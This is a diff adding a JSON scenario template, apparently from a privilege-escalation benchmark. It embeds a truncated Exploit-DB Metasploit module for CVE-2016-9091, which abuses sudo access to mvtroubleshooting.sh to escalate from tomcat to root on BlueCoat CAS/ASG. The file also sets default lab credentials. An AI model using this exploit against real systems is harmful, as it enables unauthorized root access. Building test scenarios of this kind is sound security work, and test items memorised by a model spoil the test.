@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41786",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Bluecoat ASG 6.6/CAS 1.3 - Local Privilege Escalation (Metasploit) (CVE-2016-9091)\n\nExploit source code (41786.rb):\n```\n# Exploit Title: OS Command Injection Vulnerability in BlueCoat ASG and CAS\n# Date: April 3, 2017\n# Exploit Authors:  Chris Hebert, Peter Paccione and Corey Boyd\n# Contact: chrisdhebert[at]gmail.com\n# Vendor Security Advisory: https://bto.bluecoat.com/security-advisory/sa138\n# Version: CAS 1.3 prior to 1.3.7.4 & ASG 6.6 prior to 6.6.5.4 are vulnerable\n# Tested on: BlueCoat CAS 1.3.7.1\n# CVE : cve-2016-9091\n\nTimeline:\n--------\n08/31/2016 (Vulnerablities Discovered)\n03/31/2017 (Final Vendor Patch Confirmed)\n04/03/2017 (Public Release)\n\nDescription:\nThe BlueCoat ASG and CAS management consoles are susceptible to a privilege escalation vulnerablity.\nA malicious user with tomcat privileges can escalate to root via the vulnerable mvtroubleshooting.sh script.\n\nProof of Concept:\n\nMetasploit Module - root priv escalation (via mvtroubleshooting.sh)\n-----------------\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/exploit/local/linux'\nrequire 'msf/core/exploit/exe'\n\n\nclass Metasploit4 < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'BlueCoat CAS 1.3.7.1 tomcat->root privilege escalation (via mvtroubleshooting.sh)',\n        'Description'   => %q{\n          This module abuses the sudo access granted to tomcat and the mvtroubleshooting.sh script to escalate\n          privileges. In order to work, a tomcat session with access to sudo on the sudoers\n          is needed. This module is useful for post exploitation of BlueCoat\n          vulnerabilities, where typically web server privileges are acquired, and this\n          user is allowed to execute sudo on the sudoers file.\n        },\n        'License'        => MSF_LICENSE,\n        'Author'       => [\n         'Chris Hebert <chrisdhebert[at]gmail.com>',\n         'Pete Paccione <petepaccione[at]gmail.com>',\n         'Corey Boyd <corey.k.boyd[at]gmail.com>'\n        ],\n        'DisclosureDate' => 'Vendor Contacted 8-31-2016',\n        'References'     =>\n        [\n          ['EDB', '##TBD##'],\n          ['CVE', '2016-9091' ],\n          ['URL', 'http://https://bto.bluecoat.com/security-advisory/sa138']\n        ],\n        'Platform'       => %w{ linux unix },\n        'Arch'           => [ ARCH_X86 ],\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\n        'Targets'        =>\n          [\n            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ]\n          ],\n        'DefaultOptions' => { \"PrependSetresuid\" => true, \"WfsDelay\" => 2 },\n        'DefaultTarget' => 0,\n      }\n      ))\n    register_options([\n        OptString.new(\"WritableDir\", [ false, \"A directory where we can write files\", \"/var/log\" ]),\n      ], self.class)\n  end\n\n  def check\n    id=cmd_exec(\"id -un\")\n    if id!=\"tomcat\"\n      print_sta\n```",
+  "cve": "CVE-2016-9091",
+  "exploitdb_id": "41786",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41786",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
